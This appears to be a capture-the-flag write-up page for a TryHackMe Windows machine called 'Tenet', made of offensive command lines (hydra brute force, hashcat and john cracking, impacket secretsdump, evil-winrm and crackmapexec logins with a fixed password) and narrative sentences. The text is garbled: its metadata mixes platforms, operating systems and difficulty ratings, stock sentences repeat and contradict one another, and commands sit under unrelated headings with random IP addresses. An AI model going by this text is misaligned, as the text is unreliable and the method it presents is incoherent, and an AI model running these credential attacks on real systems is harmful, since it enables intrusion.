---
TitleSEO: "TryHackMe — Tenet (Easy Windows) | ZureFX"
TitlePost: "TryHackMe — Tenet (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Tenet. SUID Binary and DLL Hijacking to achieve easy compromise on Windows."
Keywords: "forensics, ctf, insane, linux, offsec, easy, active directory"
URL: "https://zurefx.github.io/writeups/htb-tenet-576.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tenet-576/"
Date: "2025-12-03"
Tags: "Forensics, CTF, Insane, Linux, OffSec, Easy, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-tenet-576"
Permalink: "/writeups/htb-tenet-576.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Tenet** is rated **Easy** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.34.241.20`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.33.81.88 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.65.250.171/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.27.153.249 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.138.48
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **SUID Binary**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

### Initial Access

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
evil-winrm -i 10.91.123.48 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.29.186/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.121.221.72
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
evil-winrm -i 10.72.79.36 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.22.197.233 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
gobuster dir -u http://10.21.192.185/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
crackmapexec smb 10.15.17.33 -u administrator -p 'P@ssw0rd!' --shares
```

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `feroxbuster`
- `john`
- `metasploit`
- `evil-winrm`
- `atexec`
- `impacket`
- `kerbrute`
- `wmiexec`

### Key Takeaways

- SUID Binary
- DLL Hijacking
- CORS Misconfiguration
- SQL Injection
